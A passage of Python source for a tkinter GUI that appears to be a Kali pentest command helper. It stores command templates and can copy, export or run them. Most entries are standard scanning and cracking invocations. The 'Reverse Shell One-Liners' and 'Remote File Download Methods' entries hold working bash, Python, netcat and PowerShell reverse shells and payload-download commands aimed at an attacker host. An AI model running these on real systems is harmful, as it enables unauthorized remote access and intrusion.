#!/usr/bin/env python3
import os
import re
import json
import datetime
import subprocess
import tkinter as tk
from tkinter import ttk, messagebox

# ─────────────────────────────────────────────────────────────────────────────
# Command database
# ─────────────────────────────────────────────────────────────────────────────
DEFAULT_COMMANDS = [
    # Port Scanning Tasks
    {
        "category": "1. Information Gathering",
        "name": "Port Scanning / Host Discovery",
        "description": "Scan a target to identify open ports, active services, and operating systems.",
        "keywords": ["scan", "port", "nmap", "rustscan", "recon", "detect"],
        "templates": {
            "Nmap (Quick Scan)":         "nmap -T4 -F {target_ip}",
            "Nmap (Comprehensive)":      "sudo nmap -p- -sS -sV -sC -O -oN nmap_details.txt {target_ip}",
            "Rustscan (Ultra-Fast)":     "rustscan -a {target_ip} --ulimit 5000 -- -sV -sC",
            "Netcat (Fast TCP check)":   "nc -z -v -w 2 {target_ip} {port_range}",
        },
    },
    {
        "category": "1. Information Gathering",
        "name": "Subdomain Enumeration",
        "description": "Enumerate subdomains using passive OSINT or active brute-forcing.",
        "keywords": ["subdomain", "dns", "recon", "domain"],
        "templates": {
            "Subfinder (Passive OSINT)":       "subfinder -d {domain} -o subdomains.txt",
            "Amass (Passive Lookup)":           "amass enum -passive -d {domain}",
            "Gobuster (Active DNS BruteForce)": "gobuster dns -d {domain} -w {wordlist_path} -t 50",
        },
    },
    {
        "category": "2. Vulnerability Analysis",
        "name": "Nikto: Web Server Vulnerability Scan",
        "description": "Performs comprehensive scanning of web servers for dangerous items and outdated software.",
        "keywords": ["nikto", "web", "scan", "vulnerability", "server"],
        "template": "nikto -h {url_or_ip}",
    },
    {
        "category": "3. Web Applications",
        "name": "Web Directory Discovery",
        "description": "Locate hidden directories, files, or sensitive administration pages.",
        "keywords": ["gobuster", "dirb", "fuzz", "directory", "dir", "web"],
        "templates": {
            "Gobuster (Fast, Multi-Threaded)": "gobuster dir -u {url} -w {wordlist_path} -t 50",
            "Dirb (Deep Recursive Scan)":      "dirb {url} {wordlist_path}",
            "Feroxbuster (Modern Fuzzer)":     "feroxbuster -u {url} -w {wordlist_path} -t 50 -C 404",
        },
    },
    {
        "category": "4. Database Assessment",
        "name": "Sqlmap: Automate SQL Injection Check",
        "description": "Scans and tests a parameter-based URL for potential SQL injection vulnerabilities.",
        "keywords": ["sqlmap", "sql", "injection", "database", "exploit"],
        "template": 'sqlmap -u "{url_with_parameters}" --batch --dbs',
    },
    {
        "category": "5. Password Attacks",
        "name": "Password Hash Cracking",
        "description": "Decipher password hashes using wordlists and rule modifications.",
        "keywords": ["hashcat", "john", "crack", "md5", "sha256", "shadow"],
        "templates": {
            "Hashcat: MD5 (Mode 0)":        "hashcat -m 0 -a 0 {hash_file} {wordlist_path}",
            "Hashcat: SHA-256 (Mode 1400)": "hashcat -m 1400 -a 0 {hash_file} {wordlist_path}",
            "John the Ripper: Shadow":       "john --wordlist={wordlist_path} shadow_hashes.txt",
        },
    },
    {
        "category": "6. Wireless Attacks",
        "name": "Airmon-ng: Start Monitor Mode",
        "description": "Puts a wireless NIC into monitor mode.",
        "keywords": ["airmon", "wifi", "wireless", "monitor", "start"],
        "template": "sudo airmon-ng start {interface}",
    },
    {
        "category": "7. Reverse Engineering",
        "name": "Radare2: Basic Binary Inspection",
        "description": "Launches Radare2 hex editor and disassembler toolset.",
        "keywords": ["radare2", "r2", "disassemble", "reverse", "binary"],
        "template": "r2 -A {binary_path}",
    },
    {
        "category": "8. Exploitation Tools",
        "name": "Metasploit: Start Console",
        "description": "Launches the Metasploit command-line framework.",
        "keywords": ["msfconsole", "metasploit", "exploit", "framework"],
        "template": "msfconsole",
    },
    {
        "category": "8. Exploitation Tools",
        "name": "Searchsploit: Search Exploit Database",
        "description": "Searches the offline Exploit-DB archive for known exploit matches.",
        "keywords": ["searchsploit", "exploit", "search", "database", "offline"],
        "template": "searchsploit {query}",
    },
    {
        "category": "9. Sniffing & Spoofing",
        "name": "Responder: Poison LLMNR/NBT-NS",
        "description": "Poisons LLMNR, NBT-NS, and MDNS traffic to capture Windows auth hashes.",
        "keywords": ["responder", "poison", "llmnr", "nbt-ns", "hash", "capture"],
        "template": "sudo responder -I {interface} -rdwv",
    },
    {
        "category": "10. Post Exploitation & Shells",
        "name": "Reverse Shell One-Liners",
        "description": "Generate dynamic payloads to spawn reverse shell access.",
        "keywords": ["reverse", "shell", "bash", "python", "payload", "powershell"],
        "templates": {
            "Bash (-i Redirect)":           "bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1",
            "Python3 Interactive":          "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{local_ip}\",{local_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "Netcat with Exec (-e)":        "nc {local_ip} {local_port} -e /bin/bash",
            "PowerShell (TCP Client)":      'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{local_ip}",{local_port});',
        },
    },
    {
        "category": "10. Post Exploitation & Shells",
        "name": "Remote File Download Methods",
        "description": "Download payloads from your attacker machine onto the target.",
        "keywords": ["download", "curl", "wget", "powershell", "file", "transfer"],
        "templates": {
            "Linux: Curl":              "curl -o {output_filename} http://{attacker_ip}/{remote_file}",
            "Linux: Wget":              "wget http://{attacker_ip}/{remote_file}",
            "Windows: PowerShell":      "powershell -c \"Invoke-WebRequest -Uri 'http://{attacker_ip}/{remote_file}' -OutFile '{output_path}'\"",
            "Windows: Certutil":        "certutil.exe -urlcache -f http://{attacker_ip}/{remote_file} {output_filename}",
        },
    },
    {
        "category": "11. Forensic & File Analysis",
        "name": "Binwalk: Extract Embedded Files",
        "description": "Scans a firmware binary for embedded files and filesystem structures.",
        "keywords": ["binwalk", "extract", "firmware", "forensics"],
        "template": "binwalk -e {file_path}",
    },
    {
        "category": "12. Active Directory & Pivoting",
        "name": "BloodHound: Gather Domain Data",
        "description": "Collects Active Directory metadata via SharpHound ingestor.",
        "keywords": ["bloodhound", "ad", "sharphound", "domain", "pivoting"],
        "template": "sharphound -c All -d {domain}",
    },
    {
        "category": "13. Defensive Security (Blue Team)",
        "name": "Tcpdump: Network Packet Capture",
        "description": "Sniffs and records packets flowing through an interface into a PCAP.",
        "keywords": ["tcpdump", "sniff", "pcap", "wire", "defense"],
        "template": "sudo tcpdump -i {interface} -w capture.pcap",
    },
    {
        "category": "14. System Administration",
        "name": "System Resources / Port Auditing",
        "description": "Audit network interfaces, disk space, and socket connections.",
        "keywords": ["ports", "disk", "ip", "ss", "network"],
        "templates": {
            "Show Listening Ports":    "ss -tunapl",
            "Show Disk Space Usage":   "df -h",
            "Show Network Interfaces": "ip a",
        },
    },
]

CONFIG_DIR     = os.path.expanduser("~/.config/kali-assistant")
CUSTOM_FILE    = os.path.join(CONFIG_DIR, "custom_commands.json")
HISTORY_FILE   = os.path.join(CONFIG_DIR, "command_history.json")
FAVORITES_FILE = os.path.join(CONFIG_DIR, "favorites.json")
MAX_HISTORY    = 50


# ─────────────────────────────────────────────────────────────────────────────
# App
# ─────────────────────────────────────────────────────────────────────────────
class KaliAssistantApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Forest Terminal Assistant // Cyberpunk Edition")
        self.root.geometry("1200x830")
        self.root.minsize(1000, 700)

        # Force structural window pre-render cycle to map dimensions
        self.root.update_idletasks()
        try:
            self.root.attributes('-zoomed', True)  # Maximizes natively on Linux (X11)
        except Exception:
            try:
                self.root.state('zoomed')          # Maximizes natively on Windows/macOS fallback
            except Exception:
                try:
                    w = self.root.winfo_screenwidth()
                    h = self.root.winfo_screenheight()
                    self.root.geometry(f"{w}x{h}+0+0")
                except Exception:
                    pass

        # Interactive keyboard shortcuts for absolute fullscreen toggle
        self.root.bind("<F11>", self.toggle_fullscreen)
        self.root.bind("<Escape>", self.end_fullscreen)

        # ── Compact Font Scale (Reverted to standardized nested size definitions) ──
        self.font_header = ("Courier New", 11, "bold")
        self.font_title  = ("Courier New", 9, "bold")
        self.font_mono   = ("Courier New", 9, "bold")
        self.font_body   = ("Courier New", 8)
        self.font_small  = ("Courier New", 7)
        self.font_status = ("Courier New", 7)

        # ── Palette: deep forest roots + neon undergrowth ─────────────────
        self.bg_base    = "#070d09"   
        self.bg_panel   = "#0c1510"   
        self.bg_card    = "#111e15"   
        self.bg_hover   = "#182b1e"   

        self.neon_green  = "#39ff7a"  
        self.neon_lime   = "#9dff3b"  
        self.neon_teal   = "#00ffc8"  

        self.amber       = "#ffb347"  
        self.ember       = "#ff6b35"  

        self.fg_bright   = "#d4f5dc"  
        self.fg_muted    = "#3d6b4a"  

        self.border_dim    = "#1a3322"
        self.border_active = "#39ff7a"

        self.root.configure(bg=self.bg_base)
        self.root.resizable(True, True)

        # ── ttk style ─────────────────────────────────────────────────────
        self.style = ttk.Style()
        self.style.theme_use("clam")

        self.root.option_add("*TCombobox*Listbox.background",       self.bg_card)
        self.root.option_add("*TCombobox*Listbox.foreground",       self.neon_green)
        self.root.option_add("*TCombobox*Listbox.selectBackground", self.neon_green)
        self.root.option_add("*TCombobox*Listbox.selectForeground", self.bg_base)
        self.root.option_add("*TCombobox*Listbox.font",             self.font_mono)

        s = self.style
        s.configure(".",
                    background=self.bg_base, foreground=self.fg_bright,
                    fieldbackground=self.bg_card)
        s.configure("TFrame",  background=self.bg_base)
        s.configure("TLabel",  background=self.bg_base, foreground=self.fg_bright,
                    font=self.font_body)

        s.configure("TEntry",
                    fieldbackground=self.bg_card, foreground=self.neon_green,
                    insertcolor=self.neon_green, borderwidth=0, relief="flat")

        s.configure("TCombobox",
                    fieldbackground=self.bg_card, background=self.bg_panel,
                    foreground=self.neon_green, arrowcolor=self.neon_green,
                    borderwidth=0)
        s.map("TCombobox",
              fieldbackground=[("readonly", self.bg_card)],
              foreground=[("readonly", self.neon_green)])

        s.configure("TNotebook", background=self.bg_base, borderwidth=0)
        s.configure("TNotebook.Tab",
                    background=self.bg_panel, foreground=self.fg_muted,
                    padding=[16, 6], font=self.font_title)
        s.map("TNotebook.Tab",
              background=[("selected", self.bg_card)],
              foreground=[("selected", self.neon_green)])

        s.configure("TSeparator", background=self.border_dim)

        # ── State ─────────────────────────────────────────────────────────
        self.custom_commands  = self._load_json(CUSTOM_FILE,    [])
        self.history          = self._load_json(HISTORY_FILE,   [])
        self.favorites        = self._load_json(FAVORITES_FILE, [])
        self.commands_db      = DEFAULT_COMMANDS + self.custom_commands
        self.current_commands = list(self.commands_db)
        self.selected_command = None
        self.param_entries    = {}

        # ── Build UI ──────────────────────────────────────────────────────
        self._build_header()
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 10))

        self._build_explorer_tab()
        self._build_history_tab()
        self._build_favorites_tab()
        self._build_add_command_tab()

        self._populate_categories()
        self._filter_commands()

    # ══════════════════════════════════════════════════════════════════════
    # Fullscreen Toggles
    # ══════════════════════════════════════════════════════════════════════
    def toggle_fullscreen(self, event=None):
        current_state = bool(self.root.attributes('-fullscreen'))
        self.root.attributes('-fullscreen', not current_state)
        return "break"

    def end_fullscreen(self, event=None):
        self.root.attributes('-fullscreen', False)
        return "break"

    # ══════════════════════════════════════════════════════════════════════
    # Helpers
    # ══════════════════════════════════════════════════════════════════════
    def _ensure_cfg(self):
        os.makedirs(CONFIG_DIR, exist_ok=True)

    def _load_json(self, path, default):
        self._ensure_cfg()
        if os.path.exists(path):
            try:
                with open(path) as f:
                    return json.load(f)
            except Exception as e:
                print(f"[WARN] {path}: {e}")
        return default

    def _save_json(self, path, data):
        self._ensure_cfg()
        try:
            with open(path, "w") as f:
                json.dump(data, f, indent=4)
        except Exception as e:
            messagebox.showerror("Save Error", str(e))

    def _save_customs(self):
        self._save_json(CUSTOM_FILE, self.custom_commands)
        self.commands_db = DEFAULT_COMMANDS + self.custom_commands
        self._populate_categories()
        self._filter_commands()

    def _push_history(self, cmd_name, rendered):
        entry = {
            "name":      cmd_name,
            "command":   rendered,
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }
        self.history = [h for h in self.history if h["command"] != rendered]
        self.history.insert(0, entry)
        self.history = self.history[:MAX_HISTORY]
        self._save_json(HISTORY_FILE, self.history)
        self._refresh_history_tab()

    def _framed_entry(self, parent, textvariable, mono=True, ipady=5):
        """Entry widget surrounded by a 1-px neon-green border frame."""
        wrap = tk.Frame(parent, bg=self.neon_green, padx=1, pady=1)
        e = tk.Entry(
            wrap,
            textvariable=textvariable,
            bg=self.bg_card,
            fg=self.neon_green if mono else self.fg_bright,
            insertbackground=self.neon_green,
            font=self.font_mono,
            relief=tk.FLAT, bd=0,
        )
        e.pack(fill=tk.X, ipady=ipady)
        return wrap, e

    def _btn(self, parent, text, command,
             bg=None, fg=None, font=None,
             padx=10, pady=4, **kw):
        bg   = bg   or self.bg_panel
        fg   = fg   or self.fg_bright
        font = font or self.font_mono
        return tk.Button(
            parent, text=text, command=command,
            bg=bg, fg=fg, font=font,
            relief=tk.FLAT, bd=0,
            activebackground=self.bg_hover,
            activeforeground=self.neon_green,
            cursor="hand2", padx=padx, pady=pady,
            **kw,
        )

    def _section_label(self, parent, text, fg=None, font=None):
        fg   = fg   or self.neon_lime
        font = font or self.font_title
        return tk.Label(parent, text=text, bg=self.bg_base, fg=fg, font=font)

    # ══════════════════════════════════════════════════════════════════════
    # Header
    # ══════════════════════════════════════════════════════════════════════
    def _build_header(self):
        hf = tk.Frame(self.root, bg=self.bg_panel, height=44) # Scaled header bar down
        hf.pack(fill=tk.X)
        hf.pack_propagate(False)

        slab = tk.Frame(hf, bg=self.neon_green, width=8)
        slab.pack(side=tk.LEFT, fill=tk.Y)

        tk.Label(
            hf, text="  🌿 FOREST TERMINAL ASSISTANT",
            bg=self.bg_panel, fg=self.neon_green,
            font=self.font_header,
        ).pack(side=tk.LEFT, padx=10)

        tk.Label(
            hf, text="// CYBERPUNK EDITION",
            bg=self.bg_panel, fg=self.neon_teal,
            font=self.font_mono,
        ).pack(side=tk.LEFT)

        now = datetime.datetime.now().strftime("%Y-%m-%d  %H:%M")
        tk.Label(
            hf,
            text=f"ENV:ACTIVE  ●  DB:SYNCED  ●  {now}  ",
            bg=self.bg_panel, fg=self.fg_muted,
            font=self.font_status,
        ).pack(side=tk.RIGHT, padx=10)

    # ══════════════════════════════════════════════════════════════════════
    # TAB 1 — Explorer
    # ══════════════════════════════════════════════════════════════════════
    def _build_explorer_tab(self):
        tab = tk.Frame(self.notebook, bg=self.bg_base)
        self.notebook.add(tab, text="  🌿 EXPLORER  ")

        # ── Search row ────────────────────────────────────────────────────
        top = tk.Frame(tab, bg=self.bg_base)
        top.pack(fill=tk.X, padx=14, pady=(10, 4))

        tk.Label(
            top, text="SEARCH ▸",
            bg=self.bg_base, fg=self.neon_lime,
            font=self.font_title,
        ).pack(side=tk.LEFT, padx=(0, 8))

        self.search_var = tk.StringVar()
        self.search_var.trace_add("write", lambda *_: self._filter_commands())
        s_wrap = tk.Frame(top, bg=self.border_active, padx=1, pady=1)
        s_wrap.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 12))
        
        tk.Entry(
            s_wrap,
            textvariable=self.search_var,
            bg=self.bg_card, fg=self.neon_green,
            insertbackground=self.neon_green,
            font=self.font_mono,
            relief=tk.FLAT, bd=0,
        ).pack(fill=tk.X, ipady=4)

        tk.Label(
            top, text="CATEGORY ▸",
            bg=self.bg_base, fg=self.neon_lime,
            font=self.font_title,
        ).pack(side=tk.LEFT, padx=(0, 6))

        self.cat_var = tk.StringVar(value="All Categories")
        self.cat_dropdown = ttk.Combobox(
            top, textvariable=self.cat_var,
            state="readonly", width=28,
            font=self.font_body,
        )
        self.cat_dropdown.pack(side=tk.LEFT, ipady=2)
        self.cat_dropdown.bind("<<ComboboxSelected>>", lambda _: self._filter_commands())

        # ── Pane split ────────────────────────────────────────────────────
        pane = ttk.PanedWindow(tab, orient=tk.HORIZONTAL)
        pane.pack(fill=tk.BOTH, expand=True, padx=14, pady=(0, 10))

        # ── Left — listbox ────────────────────────────────────────────────
        left = tk.Frame(pane, bg=self.bg_base, padx=6)

        tk.Label(
            left, text="COMMANDS",
            bg=self.bg_base, fg=self.neon_lime,
            font=self.font_title,
            anchor=tk.W,
        ).pack(fill=tk.X, pady=(6, 2))

        lb_wrap = tk.Frame(left, bg=self.border_dim, padx=1, pady=1)
        lb_wrap.pack(fill=tk.BOTH, expand=True, pady=(0, 6))

        self.listbox = tk.Listbox(
            lb_wrap,
            bg=self.bg_panel, fg=self.fg_bright,
            selectbackground=self.neon_green,
            selectforeground=self.bg_base,
            highlightthickness=0,
            activestyle="none",
            font=self.font_mono,
            bd=0, relief=tk.FLAT,
            cursor="hand2",
            selectborderwidth=0,
        )
        self.listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        self.listbox.bind("<<ListboxSelect>>", self._on_command_select)

        sb = tk.Scrollbar(lb_wrap, orient=tk.VERTICAL,
                          command=self.listbox.yview,
                          bg=self.bg_panel, troughcolor=self.bg_base, width=8)
        sb.pack(side=tk.RIGHT, fill=tk.Y)
        self.listbox.config(yscrollcommand=sb.set)

        pane.add(left, weight=1)

        # ── Right — detail + output ───────────────────────────────────────
        right = tk.Frame(pane, bg=self.bg_base)

        title_row = tk.Frame(right, bg=self.bg_base)
        title_row.pack(fill=tk.X, padx=14, pady=(6, 0))

        self.cmd_name_label = tk.Label(
            title_row,
            text="Select a command from the list →",
            bg=self.bg_base, fg=self.neon_green,
            font=self.font_title,
            anchor=tk.W, justify=tk.LEFT,
        )
        self.cmd_name_label.pack(side=tk.LEFT, fill=tk.X, expand=True)

        self.fav_btn = self._btn(
            title_row, text="☆  FAVOURITE",
            command=self._toggle_favourite,
            fg=self.amber, bg=self.bg_panel, padx=6, pady=2,
        )
        self.fav_btn.pack(side=tk.RIGHT, padx=(6, 0))

        self.cmd_desc_text = tk.Text(
            right, height=3,
            bg=self.bg_base, fg=self.fg_muted,
            font=self.font_body,
            wrap=tk.WORD, bd=0, highlightthickness=0,
            state=tk.DISABLED,
        )
        self.cmd_desc_text.pack(fill=tk.X, padx=14, pady=(4, 0))

        self.variant_frame = tk.Frame(right, bg=self.bg_base)
        tk.Label(
            self.variant_frame, text="VARIANT ▸",
            bg=self.bg_base, fg=self.neon_lime,
            font=self.font_title,
        ).pack(side=tk.LEFT, padx=(14, 8))
        self.variant_var   = tk.StringVar()
        self.variant_combo = ttk.Combobox(
            self.variant_frame, textvariable=self.variant_var,
            state="readonly", width=46,
            font=self.font_body,
        )
        self.variant_combo.pack(side=tk.LEFT, fill=tk.X, expand=True,
                                padx=(0, 14), ipady=2)
        self.variant_combo.bind("<<ComboboxSelected>>",
                                lambda _: self._rebuild_parameters())

        self._sep = tk.Frame(right, bg=self.border_dim, height=1)

        self.param_canvas = tk.Canvas(right, bg=self.bg_base, highlightthickness=0)
        self.params_frame = tk.Frame(self.param_canvas, bg=self.bg_base)
        self.params_frame.bind(
            "<Configure>",
            lambda _: self.param_canvas.configure(
                scrollregion=self.param_canvas.bbox("all")),
        )
        self._pcwin = self.param_canvas.create_window(
            (0, 0), window=self.params_frame, anchor="nw")
        self.param_canvas.bind(
            "<Configure>",
            lambda e: self.param_canvas.itemconfig(self._pcwin, width=e.width),
        )

        out_section = tk.Frame(right, bg=self.bg_base)
        out_section.pack(fill=tk.X, padx=14, pady=(6, 8), side=tk.BOTTOM)

        tk.Label(
            out_section, text="GENERATED COMMAND",
            bg=self.bg_base, fg=self.neon_lime,
            font=self.font_title,
            anchor=tk.W,
        ).pack(fill=tk.X, pady=(0, 2))

        out_wrap = tk.Frame(out_section, bg=self.neon_green, padx=1, pady=1)
        out_wrap.pack(fill=tk.X, pady=(0, 6))
        self.output_entry = tk.Entry(
            out_wrap,
            bg=self.bg_card, fg=self.neon_teal,
            insertbackground=self.neon_teal,
            font=self.font_title,
            relief=tk.FLAT, bd=0,
        )
        self.output_entry.pack(fill=tk.X, ipady=6)

        btn_row = tk.Frame(out_section, bg=self.bg_base)
        btn_row.pack(fill=tk.X)

        self.copy_btn = self._btn(
            btn_row, text="📋  COPY",
            command=self._copy_to_clipboard,
            bg=self.bg_panel, fg=self.fg_bright,
        )
        self.copy_btn.pack(side=tk.LEFT, padx=(0, 6))

        self._btn(
            btn_row, text="📄  EXPORT .SH",
            command=self._export_to_sh,
            bg=self.bg_panel, fg=self.amber,
        ).pack(side=tk.LEFT, padx=(0, 6))

        self._btn(
            btn_row, text="⚡  RUN IN TERMINAL",
            command=self._run_in_terminal,
            bg=self.ember, fg=self.bg_base,
            font=self.font_title,
            padx=14, pady=4,
        ).pack(side=tk.LEFT, fill=tk.X, expand=True)

        pane.add(right, weight=3)

    # ══════════════════════════════════════════════════════════════════════
    # TAB 2 — History
    # ══════════════════════════════════════════════════════════════════════
    def _build_history_tab(self):
        tab = tk.Frame(self.notebook, bg=self.bg_base)
        self.notebook.add(tab, text="  ⏱ HISTORY  ")

        hdr = tk.Frame(tab, bg=self.bg_base)
        hdr.pack(fill=tk.X, padx=14, pady=(10, 6))

        tk.Label(
            hdr, text="COMMAND HISTORY",
            bg=self.bg_base, fg=self.neon_green,
            font=self.font_title,
        ).pack(side=tk.LEFT)

        self._btn(
            hdr, text="✕  CLEAR ALL",
            command=self._clear_history,
            bg=self.bg_panel, fg=self.ember, padx=6, pady=2,
        ).pack(side=tk.RIGHT)

        wrap = tk.Frame(tab, bg=self.border_dim, padx=1, pady=1)
        wrap.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 10))

        self.hist_canvas = tk.Canvas(wrap, bg=self.bg_panel, highlightthickness=0)
        self.hist_canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        hsb = tk.Scrollbar(wrap, orient=tk.VERTICAL,
                           command=self.hist_canvas.yview,
                           bg=self.bg_panel, troughcolor=self.bg_base, width=8)
        hsb.pack(side=tk.RIGHT, fill=tk.Y)
        self.hist_canvas.config(yscrollcommand=hsb.set)

        self.hist_inner = tk.Frame(self.hist_canvas, bg=self.bg_panel)
        self._hwin = self.hist_canvas.create_window(
            (0, 0), window=self.hist_inner, anchor="nw")
        self.hist_inner.bind(
            "<Configure>",
            lambda _: (
                self.hist_canvas.configure(
                    scrollregion=self.hist_canvas.bbox("all")),
                self.hist_canvas.itemconfig(
                    self._hwin, width=self.hist_canvas.winfo_width()),
            ),
        )
        self.hist_canvas.bind(
            "<Configure>",
            lambda e: self.hist_canvas.itemconfig(self._hwin, width=e.width),
        )

        self._refresh_history_tab()

    def _refresh_history_tab(self):
        for w in self.hist_inner.winfo_children():
            w.destroy()
        if not self.history:
            tk.Label(
                self.hist_inner,
                text="No history yet.  Run a command!",
                bg=self.bg_panel, fg=self.fg_muted,
                font=self.font_body,
            ).pack(pady=30)
            return
        for i, entry in enumerate(self.history):
            self._hist_row(self.hist_inner, entry, i)

    def _hist_row(self, parent, entry, idx):
        row_bg = self.bg_panel if idx % 2 == 0 else self.bg_card
        row = tk.Frame(parent, bg=row_bg, pady=7, padx=12)
        row.pack(fill=tk.X)

        tk.Label(
            row,
            text=f"[{entry['timestamp']}]  {entry['name']}",
            bg=row_bg, fg=self.fg_muted,
            font=self.font_status,
            anchor=tk.W, justify=tk.LEFT,
        ).pack(fill=tk.X)

        cmd_row = tk.Frame(row, bg=row_bg)
        cmd_row.pack(fill=tk.X, pady=(3, 0))

        tk.Label(
            cmd_row,
            text=entry["command"],
            bg=row_bg, fg=self.neon_green,
            font=self.font_mono,
            anchor=tk.W, justify=tk.LEFT,
        ).pack(side=tk.LEFT, fill=tk.X, expand=True)

        self._btn(
            cmd_row, text="USE",
            command=lambda c=entry["command"]: self._load_from_history(c),
            bg=self.neon_green, fg=self.bg_base,
            padx=6, pady=2,
        ).pack(side=tk.RIGHT, padx=(8, 0))

    def _load_from_history(self, command):
        self.output_entry.delete(0, tk.END)
        self.output_entry.insert(0, command)
        self.notebook.select(0)

    def _clear_history(self):
        if messagebox.askyesno("Clear History", "Delete all command history?"):
            self.history = []
            self._save_json(HISTORY_FILE, self.history)
            self._refresh_history_tab()

    # ══════════════════════════════════════════════════════════════════════
    # TAB 3 — Favourites
    # ══════════════════════════════════════════════════════════════════════
    def _build_favorites_tab(self):
        tab = tk.Frame(self.notebook, bg=self.bg_base)
        self.notebook.add(tab, text="  ★ FAVOURITES  ")

        tk.Label(
            tab, text="BOOKMARKED COMMANDS",
            bg=self.bg_base, fg=self.neon_green,
            font=self.font_title,
        ).pack(anchor=tk.W, padx=14, pady=(10, 6))

        wrap = tk.Frame(tab, bg=self.border_dim, padx=1, pady=1)
        wrap.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 10))

        self.fav_canvas = tk.Canvas(wrap, bg=self.bg_panel, highlightthickness=0)
        self.fav_canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        fsb = tk.Scrollbar(wrap, orient=tk.VERTICAL,
                           command=self.fav_canvas.yview,
                           bg=self.bg_panel, troughcolor=self.bg_base, width=8)
        fsb.pack(side=tk.RIGHT, fill=tk.Y)
        self.fav_canvas.config(yscrollcommand=fsb.set)

        self.fav_inner = tk.Frame(self.fav_canvas, bg=self.bg_panel)
        self._fwin = self.fav_canvas.create_window(
            (0, 0), window=self.fav_inner, anchor="nw")
        self.fav_inner.bind(
            "<Configure>",
            lambda _: (
                self.fav_canvas.configure(
                    scrollregion=self.fav_canvas.bbox("all")),
                self.fav_canvas.itemconfig(
                    self._fwin, width=self.fav_canvas.winfo_width()),
            ),
        )
        self.fav_canvas.bind(
            "<Configure>",
            lambda e: self.fav_canvas.itemconfig(self._fwin, width=e.width),
        )

        self._refresh_favorites_tab()

    def _refresh_favorites_tab(self):
        for w in self.fav_inner.winfo_children():
            w.destroy()
        fav_cmds = [c for c in self.commands_db if c["name"] in self.favorites]
        if not fav_cmds:
            tk.Label(
                self.fav_inner,
                text="No favourites yet.  Press ☆ on any command.",
                bg=self.bg_panel, fg=self.fg_muted,
                font=self.font_body,
            ).pack(pady=30)
            return
        for i, cmd in enumerate(fav_cmds):
            self._fav_row(self.fav_inner, cmd, i)

    def _fav_row(self, parent, cmd, idx):
        row_bg = self.bg_panel if idx % 2 == 0 else self.bg_card
        row = tk.Frame(parent, bg=row_bg, pady=9, padx=14)
        row.pack(fill=tk.X)

        tk.Label(
            row,
            text=f"[ {cmd['category']} ]",
            bg=row_bg, fg=self.fg_muted,
            font=self.font_status,
            anchor=tk.W,
        ).pack(fill=tk.X)

        title_row = tk.Frame(row, bg=row_bg)
        title_row.pack(fill=tk.X, pady=(3, 0))

        tk.Label(
            title_row, text=cmd["name"],
            bg=row_bg, fg=self.amber,
            font=self.font_title,
            anchor=tk.W,
        ).pack(side=tk.LEFT, fill=tk.X, expand=True)

        self._btn(
            title_row, text="★ REMOVE",
            command=lambda n=cmd["name"]: self._remove_favourite(n),
            bg=self.bg_panel, fg=self.ember, padx=6, pady=2,
        ).pack(side=tk.RIGHT, padx=(6, 0))

        self._btn(
            title_row, text="JUMP TO",
            command=lambda n=cmd["name"]: self._jump_to_command(n),
            bg=self.neon_green, fg=self.bg_base, padx=6, pady=2,
        ).pack(side=tk.RIGHT, padx=(6, 0))

        tk.Label(
            row, text=cmd["description"],
            bg=row_bg, fg=self.fg_muted,
            font=self.font_status,
            anchor=tk.W, justify=tk.LEFT,
        ).pack(fill=tk.X, pady=(4, 0))

    def _toggle_favourite(self):
        if not self.selected_command:
            return
        name = self.selected_command["name"]
        if name in self.favorites:
            self.favorites.remove(name)
        else:
            self.favorites.append(name)
        self._save_json(FAVORITES_FILE, self.favorites)
        self._update_fav_btn()
        self._refresh_favorites_tab()
        self._update_listbox(self.search_var.get().lower().strip())

    def _remove_favourite(self, name):
        if name in self.favorites:
            self.favorites.remove(name)
            self._save_json(FAVORITES_FILE, self.favorites)
            self._update_fav_btn()
            self._refresh_favorites_tab()
            self._update_listbox(self.search_var.get().lower().strip())

    def _update_fav_btn(self):
        if self.selected_command and self.selected_command["name"] in self.favorites:
            self.fav_btn.config(text="★  FAVOURITED", fg=self.amber)
        else:
            self.fav_btn.config(text="☆  FAVOURITE",  fg=self.amber)

    def _jump_to_command(self, name):
        self.notebook.select(0)
        for i, cmd in enumerate(self.current_commands):
            if cmd["name"] == name:
                self.listbox.selection_clear(0, tk.END)
                self.listbox.selection_set(i)
                self.listbox.see(i)
                self._on_command_select(None)
                return
        self.search_var.set("")
        self.cat_var.set("All Categories")
        self._filter_commands()
        for i, cmd in enumerate(self.current_commands):
            if cmd["name"] == name:
                self.listbox.selection_clear(0, tk.END)
                self.listbox.selection_set(i)
                self.listbox.see(i)
                self._on_command_select(None)
                return

    # ══════════════════════════════════════════════════════════════════════
    # TAB 4 — Add Custom Command
    # ══════════════════════════════════════════════════════════════════════
    def _build_add_command_tab(self):
        tab = tk.Frame(self.notebook, bg=self.bg_base)
        self.notebook.add(tab, text="  ＋ ADD COMMAND  ")

        canvas = tk.Canvas(tab, bg=self.bg_base, highlightthickness=0)
        canvas.pack(fill=tk.BOTH, expand=True, side=tk.LEFT)

        vsb = tk.Scrollbar(tab, orient=tk.VERTICAL, command=canvas.yview,
                           bg=self.bg_panel, troughcolor=self.bg_base, width=8)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)
        canvas.config(yscrollcommand=vsb.set)

        container = tk.Frame(canvas, bg=self.bg_base, padx=24, pady=14)
        container.bind("<Configure>",
                       lambda _: canvas.configure(
                           scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=container,
                             anchor="nw", width=950)

        tk.Label(
            container,
            text="REGISTER CUSTOM COMMAND",
            bg=self.bg_base, fg=self.neon_green,
            font=self.font_header,
            anchor=tk.W,
